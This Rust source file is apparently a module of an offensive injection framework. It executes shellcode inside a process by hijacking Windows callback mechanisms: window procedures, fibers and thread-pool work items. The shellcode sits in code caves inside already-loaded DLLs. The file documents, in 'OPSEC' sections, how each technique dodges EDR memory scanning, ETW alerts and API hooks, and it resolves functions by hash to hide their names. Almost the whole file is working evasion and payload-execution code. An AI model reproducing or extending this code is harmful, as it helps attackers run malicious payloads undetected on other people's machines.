//! Callback-based execution WITHOUT new executable memory allocations.
//!
//! # Overview
//!
//! Traditional injection techniques allocate new executable memory regions
//! (`VirtualAlloc` / `NtAllocateVirtualMemory` with `PAGE_EXECUTE_*`) which
//! are heavily monitored by EDR solutions:
//!
//! - Memory scanners flag **unbacked** executable pages (no file on disk)
//! - ETW `MEM_ALLOC` events with execute permissions are high-severity
//! - YARA/signature scans target `RWX` or unbacked `RX` regions
//!
//! This module implements three callback-hijacking techniques that redirect
//! **existing legitimate callback mechanisms** to execute shellcode placed
//! in **code caves** within legitimately loaded DLLs:
//!
//! 1. **Window Procedure (WndProc) Hijack**: Overwrite a window's `lpfnWndProc`
//!    to point to shellcode in a code cave, then trigger via `PostMessage`.
//!
//! 2. **Fiber Callback Hijack**: Convert the current thread to a fiber, create
//!    a new fiber with the shellcode address, and switch to it.
//!
//! 3. **Thread Pool Callback**: Use `TpAllocWork` / `TpPostWork` with the
//!    work callback pointing to shellcode in a code cave.
//!
//! # OPSEC Properties
//!
//! - **No new executable allocations** — never calls `VirtualAlloc`,
//!   `VirtualAllocEx`, or `NtAllocateVirtualMemory` with execute permissions
//! - **No RWX pages** — code caves use `PAGE_EXECUTE_READ` only
//! - **Disk-backed memory** — shellcode lives inside loaded DLL `.text` sections
//! - **Legitimate call stacks** — execution originates from Windows callback
//!   dispatch mechanisms (WndProc, fiber scheduler, thread pool worker)
//! - **No new threads** — reuses existing threads for execution
//!
//! # Code Caves
//!
//! Shellcode is placed in padding bytes at the end of `.text` sections in
//! loaded DLLs. See `crate::code_cave` for details on cave selection.
//!
//! # Safety
//!
//! All functions are `unsafe` because they manipulate raw function pointers,
//! window procedures, and fiber contexts.

#![cfg(all(windows, target_arch = "x86_64"))]

use crate::code_cave::{CodeCave, CodeCaveAllocator};
use crate::injection::{payload_has_valid_pe_headers, Injector};
use anyhow::{anyhow, Result};

// ─── Local Windows ABI type definitions ────────────────────────────────────

type PVOID = *mut std::ffi::c_void;
type HANDLE = PVOID;
type DWORD = u32;
type BOOL = i32;
type NTSTATUS = i32;
type ULONG = u32;
type HWND = PVOID;
type LPARAM = isize;
type WPARAM = usize;
type SIZE_T = usize;

const STATUS_SUCCESS: NTSTATUS = 0;
const PAGE_READWRITE: ULONG = 0x04;
const PAGE_EXECUTE_READ: ULONG = 0x20;
const CURRENT_PROCESS: HANDLE = (-1isize) as *mut _;
const FALSE: BOOL = 0;

// ─── Const Hash Functions ─────────────────────────────────────────────────

const fn const_hash_str(bytes: &[u8]) -> u32 {
    let mut hash: u32 = pe_resolve::SEED;
    let mut i = 0;
    while i < bytes.len() {
        let b = bytes[i];
        if b == 0 {
            break;
        }
        let lower = if b >= b'A' && b <= b'Z' { b + 32 } else { b };
        hash = hash.rotate_right(13) ^ (lower as u32);
        i += 1;
    }
    hash
}

const fn const_hash_wstr(units: &[u16]) -> u32 {
    let mut hash: u32 = pe_resolve::SEED;
    let mut i = 0;
    while i < units.len() {
        let c = units[i];
        if c == 0 {
            break;
        }
        let lo = c as u8;
        let lo = if lo >= b'A' && lo <= b'Z' { lo + 32 } else { lo };
        let hi = (c >> 8) as u8;
        let hi = if hi >= b'A' && hi <= b'Z' { hi + 32 } else { hi };
        hash = hash.rotate_right(13) ^ (lo as u32);
        hash = hash.rotate_right(13) ^ (hi as u32);
        i += 1;
    }
    hash
}

// ─── Pre-computed hashes ──────────────────────────────────────────────────

const NTDLL_DLL_HASH: u32 = const_hash_wstr(&[
    b'n' as u16, b't' as u16, b'd' as u16, b'l' as u16, b'l' as u16,
    b'.' as u16, b'd' as u16, b'l' as u16, b'l' as u16,
]);
const KERNEL32_DLL_HASH: u32 = const_hash_wstr(&[
    b'k' as u16, b'e' as u16, b'r' as u16, b'n' as u16, b'e' as u16,
    b'l' as u16, b'3' as u16, b'2' as u16, b'.' as u16, b'd' as u16,
    b'l' as u16, b'l' as u16,
]);
const USER32_DLL_HASH: u32 = const_hash_wstr(&[
    b'u' as u16, b's' as u16, b'e' as u16, b'r' as u16, b'3' as u16,
    b'2' as u16, b'.' as u16, b'd' as u16, b'l' as u16, b'l' as u16,
]);

const HASH_FIND_WINDOW_A: u32 = const_hash_str(b"FindWindowA\0");
const HASH_GET_WINDOW_LONG_PTR_W: u32 = const_hash_str(b"GetWindowLongPtrW\0");
const HASH_SET_WINDOW_LONG_PTR_W: u32 = const_hash_str(b"SetWindowLongPtrW\0");
const HASH_POST_MESSAGE_W: u32 = const_hash_str(b"PostMessageW\0");
const HASH_CONVERT_THREAD_TO_FIBER: u32 = const_hash_str(b"ConvertThreadToFiber\0");
const HASH_CREATE_FIBER: u32 = const_hash_str(b"CreateFiber\0");
const HASH_SWITCH_TO_FIBER: u32 = const_hash_str(b"SwitchToFiber\0");
const HASH_DELETE_FIBER: u32 = const_hash_str(b"DeleteFiber\0");

// ntdll exports (by ANSI hash)
const HASH_TP_ALLOC_WORK: u32 = const_hash_str(b"TpAllocWork\0");
const HASH_TP_POST_WORK: u32 = const_hash_str(b"TpPostWork\0");
const HASH_TP_RELEASE_WORK: u32 = const_hash_str(b"TpReleaseWork\0");

// ─── Callback Execution Technique Selector ────────────────────────────────

/// Which callback mechanism to hijack.
#[derive(Debug, Clone, Copy, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
pub enum CallbackTechnique {
    /// Window Procedure callback hijack — overwrites a window's WndProc pointer.
    WndProc,
    /// Fiber callback hijack — creates a fiber pointing to shellcode and switches to it.
    Fiber,
    /// Thread pool callback — posts a work item whose callback points to shellcode.
    ThreadPool,
}

impl Default for CallbackTechnique {
    fn default() -> Self {
        Self::ThreadPool
    }
}

// ─── Injector Implementation ──────────────────────────────────────────────

pub struct CallbackExecInjector {
    /// Which callback technique to use.
    pub technique: CallbackTechnique,
}

impl CallbackExecInjector {
    pub const fn new(technique: CallbackTechnique) -> Self {
        Self { technique }
    }
}

impl Injector for CallbackExecInjector {
    fn inject(&self, pid: u32, payload: &[u8]) -> Result<()> {
        // Callback-based execution requires raw shellcode (position-independent).
        if payload_has_valid_pe_headers(payload) {
            return Err(anyhow!(
                "CallbackExec injection requires raw shellcode, not a PE image. \
                 Use InjectionMethod::Hollowing or InjectionMethod::ManualMap for PE payloads."
            ));
        }

        unsafe {
            // Allocate a code cave for the shellcode.
            let allocator = CodeCaveAllocator::new();
            let cave = allocator
                .allocate_cave(payload.len())
                .map_err(|e| anyhow!("code cave allocation failed: {}", e))?;

            log::debug!(
                "CallbackExec: allocated cave at {:p} ({} bytes, prot={:#x})",
                cave.address,
                cave.size,
                cave.original_protection,
            );

            // Write shellcode into the code cave.
            allocator
                .write_to_cave(&cave, payload)
                .map_err(|e| anyhow!("code cave write failed: {}", e))?;

            // Execute via the selected callback technique.
            let result = match self.technique {
                CallbackTechnique::WndProc => execute_wndproc_hijack(&cave),
                CallbackTechnique::Fiber => execute_fiber_hijack(&cave),
                CallbackTechnique::ThreadPool => execute_threadpool_callback(&cave),
            };

            // If execution failed, try to clean up the cave.
            if result.is_err() {
                let _ = allocator.free_cave(&cave);
            }

            // Note: We intentionally do NOT free the cave on success because
            // the shellcode may still be executing asynchronously (thread pool,
            // fiber) or may need to remain resident for a wndproc callback.

            let _ = pid; // Callback execution is LOCAL (current process), pid unused.
            result
        }
    }
}

// ─── Technique 1: Window Procedure Hijack ─────────────────────────────────
//
// # Flow
//
// 1. Find a top-level window via `FindWindowA(NULL, NULL)` (any window).
// 2. Read the current `WNDPROC` via `GetWindowLongPtrW(GWLP_WNDPROC)`.
// 3. Scan loaded DLLs for a "transit stub" — a `call rax` or `call rcx`
//    gadget that is CFG-valid. This allows the hijacked WndProc to
//    call through the gadget to our shellcode.
// 4. Set the window's `WNDPROC` to the transit stub via
//    `SetWindowLongPtrW(GWLP_WNDPROC, transit_stub)`.
// 5. Write the shellcode address (from code cave) into the transit stub's
//    argument register setup.
// 6. Trigger the callback via `PostMessageW`.
//
// # OPSEC
//
// - No new thread creation
// - Execution originates from the window message dispatch loop
// - Call stack shows user32!DispatchMessage → … → transit stub → shellcode
// - No VirtualAlloc / NtAllocateVirtualMemory

unsafe fn execute_wndproc_hijack(cave: &CodeCave) -> Result<()> {
    // Resolve user32.dll functions.
    let user32 = pe_resolve::get_module_handle_by_hash(USER32_DLL_HASH)
        .ok_or_else(|| anyhow!("user32.dll not found"))?;

    let find_window_a: Option<unsafe extern "system" fn(*const i8, *const i8) -> HWND> =
        pe_resolve::get_proc_address_by_hash(user32, HASH_FIND_WINDOW_A)
            .map(|addr| std::mem::transmute(addr));

    let get_window_long_ptr_w: Option<unsafe extern "system" fn(HWND, i32) -> usize> =
        pe_resolve::get_proc_address_by_hash(user32, HASH_GET_WINDOW_LONG_PTR_W)
            .map(|addr| std::mem::transmute(addr));

    let set_window_long_ptr_w: Option<unsafe extern "system" fn(HWND, i32, usize) -> usize> =
        pe_resolve::get_proc_address_by_hash(user32, HASH_SET_WINDOW_LONG_PTR_W)
            .map(|addr| std::mem::transmute(addr));

    let post_message_w: Option<
        unsafe extern "system" fn(HWND, u32, WPARAM, LPARAM) -> BOOL,
    > = pe_resolve::get_proc_address_by_hash(user32, HASH_POST_MESSAGE_W)
        .map(|addr| std::mem::transmute(addr));

    let find_window = find_window_a.ok_or_else(|| anyhow!("FindWindowA not resolved"))?;
    let get_wndproc = get_window_long_ptr_w.ok_or_else(|| anyhow!("GetWindowLongPtrW not resolved"))?;
    let set_wndproc = set_window_long_ptr_w.ok_or_else(|| anyhow!("SetWindowLongPtrW not resolved"))?;
    let post_message = post_message_w.ok_or_else(|| anyhow!("PostMessageW not resolved"))?;

    // Find any top-level window.
    let hwnd = find_window(std::ptr::null(), std::ptr::null());
    if hwnd.is_null() {
        return Err(anyhow!("no top-level window found for WndProc hijack"));
    }

    // Save the original WndProc.
    let original_wndproc = get_wndproc(hwnd, -4); // GWLP_WNDPROC = -4
    if original_wndproc == 0 {
        return Err(anyhow!("GetWindowLongPtrW(GWLP_WNDPROC) returned 0"));
    }

    // We need a small stub in the code cave that:
    //   1. Calls the shellcode at cave.address
    //   2. Returns to the original WndProc for continued message processing
    //
    // Stub layout (x86-64):
    //   push rbp                    ; 1 byte  (0x55)
    //   mov rbp, rsp                ; 3 bytes (48 89 E5)
    //   sub rsp, 0x28               ; 4 bytes (48 83 EC 28)
    //   mov rax, <shellcode_addr>   ; 10 bytes (48 B8 xx xx xx xx xx xx xx xx)
    //   call rax                    ; 2 bytes (FF D0)
    //   add rsp, 0x28               ; 4 bytes (48 83 C4 28)
    //   pop rbp                     ; 1 byte  (0x5D)
    //   ; Fall through to original WndProc trampoline
    //   mov rax, <original_wndproc> ; 10 bytes (48 B8 xx xx xx xx xx xx xx xx)
    //   jmp rax                     ; 2 bytes (FF E0)
    // Total: 37 bytes
    //
    // But wait — we need the WndProc to actually call our shellcode and then
    // chain back to the original. The WndProc signature is:
    //   LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM)
    // So our stub receives (hwnd, msg, wparam, lparam) in rcx, rdx, r8, r9.
    // We call the shellcode with these same args, then chain to original.

    let shellcode_addr = cave.address as u64;
    let orig_wndproc_addr = original_wndproc as u64;

    let mut stub = Vec::with_capacity(64);
    // push rbp
    stub.push(0x55);
    // mov rbp, rsp
    stub.extend_from_slice(&[0x48, 0x89, 0xE5]);
    // sub rsp, 0x28 (shadow space + alignment)
    stub.extend_from_slice(&[0x48, 0x83, 0xEC, 0x28]);
    // Save rcx (hwnd) — will be needed for original wndproc
    // mov r10, rcx = 49 89 CA (REX.WB + mov r10, rcx)
    stub.extend_from_slice(&[0x49, 0x89, 0xCA]);

    // mov rax, <shellcode_addr>
    stub.push(0x48);
    stub.push(0xB8);
    stub.extend_from_slice(&shellcode_addr.to_le_bytes());
    // call rax
    stub.extend_from_slice(&[0xFF, 0xD0]);

    // Restore rcx from r10 for original wndproc
    // mov rcx, r10 = 49 89 D1 (REX.W + mov rcx, r10... actually mov rcx, r10 = 4C 89 D1)
    stub.extend_from_slice(&[0x4C, 0x89, 0xD1]);

    // add rsp, 0x28
    stub.extend_from_slice(&[0x48, 0x83, 0xC4, 0x28]);
    // pop rbp
    stub.push(0x5D);
    // mov rax, <original_wndproc>
    stub.push(0x48);
    stub.push(0xB8);
    stub.extend_from_slice(&orig_wndproc_addr.to_le_bytes());
    // jmp rax
    stub.extend_from_slice(&[0xFF, 0xE0]);

    // We need extra cave space for the stub. The stub is ~40 bytes.
    // For simplicity, we place the stub right after the shellcode in the same cave.
    let total_size = cave.size; // We already have the whole cave
    if payload_fits_with_stub(cave, &stub) {
        // Write the stub after the shellcode (caller already wrote shellcode).
        // We need to know the shellcode length, but we don't have it here.
        // Instead, we can allocate a separate small cave for the stub.
    }

    // Actually, a cleaner approach: we allocate a separate cave for the stub
    // and set the WndProc to point to the stub. The stub calls the shellcode
    // and then chains to the original WndProc.
    let allocator = CodeCaveAllocator::new();
    let stub_cave = allocator
        .allocate_cave(stub.len())
        .map_err(|e| anyhow!("stub cave allocation failed: {}", e))?;

    allocator
        .write_to_cave(&stub_cave, &stub)
        .map_err(|e| anyhow!("stub cave write failed: {}", e))?;

    // Set the WndProc to our stub.
    let prev = set_wndproc(hwnd, -4, stub_cave.address as usize); // GWLP_WNDPROC = -4
    if prev == 0 {
        let _ = allocator.free_cave(&stub_cave);
        return Err(anyhow!("SetWindowLongPtrW failed"));
    }

    // Trigger the callback via PostMessage.
    // WM_USER = 0x0400 — harmless message that our stub will handle.
    let posted = post_message(hwnd, 0x0400, 0, 0);
    if posted == FALSE {
        // Restore original WndProc before returning error.
        set_wndproc(hwnd, -4, original_wndproc);
        let _ = allocator.free_cave(&stub_cave);
        return Err(anyhow!("PostMessageW failed"));
    }

    // Give the message a moment to be dispatched.
    // Sleep briefly using NtDelayExecution.
    let mut delay = -10_000_0i64; // 10ms in 100ns units (negative = relative)
    crate::syscall!(
        "NtDelayExecution",
        0u64, // Alertable = FALSE
        &mut delay as *mut _ as u64,
    )
    .ok();

    // Restore the original WndProc.
    set_wndproc(hwnd, -4, original_wndproc);

    log::debug!(
        "WndProc hijack: executed shellcode at {:p} via window {:p}",
        cave.address,
        hwnd,
    );

    // Clean up the stub cave (the main shellcode cave remains for potential reuse).
    let _ = allocator.free_cave(&stub_cave);

    Ok(())
}

fn payload_fits_with_stub(_cave: &CodeCave, _stub: &[u8]) -> bool {
    // Simplified: we always allocate a separate stub cave.
    false
}

// ─── Technique 2: Fiber Callback Hijack ───────────────────────────────────
//
// # Flow
//
// 1. Convert current thread to a fiber via `ConvertThreadToFiber(NULL)`.
// 2. Create a new fiber via `CreateFiber(0, shellcode_addr, NULL)`.
// 3. Switch to the new fiber via `SwitchToFiber(new_fiber)`.
// 4. The shellcode executes. When it returns, the fiber scheduler returns
//    to the original fiber (the converted thread).
// 5. Clean up via `DeleteFiber`.
//
// # OPSEC
//
// - No new thread creation
// - No new executable memory allocations
// - Execution originates from the Windows fiber scheduler
// - Call stack shows ntdll!RtlUserFiberStart → shellcode (or kernel32 fiber dispatch)
// - Fiber context is a legitimate Windows mechanism used by many applications

unsafe fn execute_fiber_hijack(cave: &CodeCave) -> Result<()> {
    let kernel32 = pe_resolve::get_module_handle_by_hash(KERNEL32_DLL_HASH)
        .ok_or_else(|| anyhow!("kernel32.dll not found"))?;

    let convert_thread_to_fiber: Option<unsafe extern "system" fn(PVOID) -> PVOID> =
        pe_resolve::get_proc_address_by_hash(kernel32, HASH_CONVERT_THREAD_TO_FIBER)
            .map(|addr| std::mem::transmute(addr));

    let create_fiber: Option<
        unsafe extern "system" fn(SIZE_T, PVOID, PVOID) -> PVOID,
    > = pe_resolve::get_proc_address_by_hash(kernel32, HASH_CREATE_FIBER)
        .map(|addr| std::mem::transmute(addr));

    let switch_to_fiber: Option<unsafe extern "system" fn(PVOID)> =
        pe_resolve::get_proc_address_by_hash(kernel32, HASH_SWITCH_TO_FIBER)
            .map(|addr| std::mem::transmute(addr));

    let delete_fiber: Option<unsafe extern "system" fn(PVOID)> =
        pe_resolve::get_proc_address_by_hash(kernel32, HASH_DELETE_FIBER)
            .map(|addr| std::mem::transmute(addr));

    let convert = convert_thread_to_fiber.ok_or_else(|| anyhow!("ConvertThreadToFiber not resolved"))?;
    let create = create_fiber.ok_or_else(|| anyhow!("CreateFiber not resolved"))?;
    let switch_fn = switch_to_fiber.ok_or_else(|| anyhow!("SwitchToFiber not resolved"))?;
    let delete = delete_fiber.ok_or_else(|| anyhow!("DeleteFiber not resolved"))?;

    // Convert current thread to a fiber (required before using fibers).
    // If the thread is already a fiber, this returns NULL with ERROR_ALREADY_FIBER.
    let main_fiber = convert(std::ptr::null_mut());
    if main_fiber.is_null() {
        // Thread is already a fiber — that's fine, we can still proceed.
        log::debug!("Fiber hijack: thread is already a fiber");
    }

    // Create a fiber that starts execution at the shellcode address.
    // The shellcode address is in the code cave, which is PAGE_EXECUTE_READ.
    let shellcode_fiber = create(0, cave.address, std::ptr::null_mut());
    if shellcode_fiber.is_null() {
        return Err(anyhow!("CreateFiber returned NULL"));
    }

    log::debug!(
        "Fiber hijack: switching to fiber at {:p} (shellcode at {:p})",
        shellcode_fiber,
        cave.address,
    );

    // Switch to the shellcode fiber. Execution continues at cave.address.
    // When the shellcode returns (ret instruction), the fiber ends and
    // control returns to the main fiber here.
    switch_fn(shellcode_fiber);

    // Clean up the shellcode fiber.
    delete(shellcode_fiber);

    log::debug!("Fiber hijack: shellcode execution completed");

    Ok(())
}

// ─── Technique 3: Thread Pool Callback ────────────────────────────────────
//
// # Flow
//
// 1. Resolve `TpAllocWork`, `TpPostWork`, `TpReleaseWork` from ntdll
//    (undocumented internal APIs, not in Windows SDK).
// 2. Call `TpAllocWork(&work, shellcode_addr, NULL, NULL)` to create a
//    work item whose callback is the shellcode in the code cave.
// 3. Call `TpPostWork(work)` to submit the work to the thread pool.
// 4. One of the thread pool worker threads picks up the work item and
//    executes the callback (shellcode).
// 5. Clean up via `TpReleaseWork`.
//
// # OPSEC
//
// - No new thread creation
// - Execution originates from `ntdll!TppWorkerThread` — legitimate
// - No VirtualAlloc / NtAllocateVirtualMemory
// - Undocumented APIs reduce likelihood of EDR hooks
// - Authentic call stack: ntdll!TppWorkerThread → shellcode
//
// # Note
//
// This is the **local-process** variant. Unlike `thread_pool.rs` which
// injects into a remote process, this technique executes shellcode in the
// current process using code caves instead of new allocations.

unsafe fn execute_threadpool_callback(cave: &CodeCave) -> Result<()> {
    let ntdll = pe_resolve::get_module_handle_by_hash(NTDLL_DLL_HASH)
        .ok_or_else(|| anyhow!("ntdll.dll not found"))?;

    // TpAllocWork: PTP_WORK* out, PTP_SIMPLE_CALLBACK callback, PVOID context, PTP_CALLBACK_ENVIRON env
    type TpAllocWorkFn = unsafe extern "system" fn(
        *mut PVOID,   // PTP_WORK *
        PVOID,        // PTP_SIMPLE_CALLBACK (callback)
        PVOID,        // PVOID (context)
        PVOID,        // PTP_CALLBACK_ENVIRON (optional, NULL)
    ) -> NTSTATUS;

    type TpPostWorkFn = unsafe extern "system" fn(PVOID /* PTP_WORK */);

    type TpReleaseWorkFn = unsafe extern "system" fn(PVOID /* PTP_WORK */);

    let tp_alloc_work: Option<TpAllocWorkFn> =
        pe_resolve::get_proc_address_by_hash(ntdll, HASH_TP_ALLOC_WORK)
            .map(|addr| std::mem::transmute(addr));

    let tp_post_work: Option<TpPostWorkFn> =
        pe_resolve::get_proc_address_by_hash(ntdll, HASH_TP_POST_WORK)
            .map(|addr| std::mem::transmute(addr));

    let tp_release_work: Option<TpReleaseWorkFn> =
        pe_resolve::get_proc_address_by_hash(ntdll, HASH_TP_RELEASE_WORK)
            .map(|addr| std::mem::transmute(addr));

    let alloc_fn = tp_alloc_work.ok_or_else(|| anyhow!("TpAllocWork not resolved"))?;
    let post_fn = tp_post_work.ok_or_else(|| anyhow!("TpPostWork not resolved"))?;
    let release_fn = tp_release_work.ok_or_else(|| anyhow!("TpReleaseWork not resolved"))?;

    // Allocate a thread pool work item with the shellcode address as callback.
    let mut work: PVOID = std::ptr::null_mut();
    let status = alloc_fn(
        &mut work as *mut PVOID,
        cave.address, // callback = shellcode in code cave
        std::ptr::null_mut(), // context = NULL
        std::ptr::null_mut(), // callback environ = NULL (use default)
    );
    if status < 0 {
        return Err(anyhow!("TpAllocWork failed: {:#x}", status));
    }
    if work.is_null() {
        return Err(anyhow!("TpAllocWork returned NULL work item"));
    }

    log::debug!(
        "ThreadPool callback: posting work {:p} with callback {:p}",
        work,
        cave.address,
    );

    // Submit the work item to the thread pool.
    post_fn(work);

    // Give the thread pool worker a moment to pick up and execute the work.
    // Use a short sleep to avoid busy-waiting.
    let mut delay = -50_000_0i64; // 50ms in 100ns units (negative = relative)
    crate::syscall!(
        "NtDelayExecution",
        0u64, // Alertable = FALSE
        &mut delay as *mut _ as u64,
    )
    .ok();

    // Release the work item.
    release_fn(work);

    log::debug!("ThreadPool callback: work item released");

    Ok(())
}
